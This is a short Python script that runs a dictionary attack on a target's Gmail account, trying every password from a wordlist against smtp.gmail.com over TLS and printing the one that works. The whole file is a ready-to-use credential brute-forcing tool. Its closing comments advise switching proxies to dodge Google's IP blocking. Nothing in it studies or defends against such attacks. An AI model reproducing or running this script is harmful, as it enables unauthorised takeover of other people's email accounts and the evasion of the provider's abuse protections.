# Gmail dictionary attack v2
# Brute force smtp.gmail.com using dictionary attack over TLS

import smtplib

from past.builtins import raw_input

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's gmail address:")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpserver.login(user, password)
        print("[+] Password found: %s" %password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[!] Password Incorrect: %s" %password)


# Will not work for 2-F auth
# Change your proxy before hitting gmail 100 times else your IP will be blocked
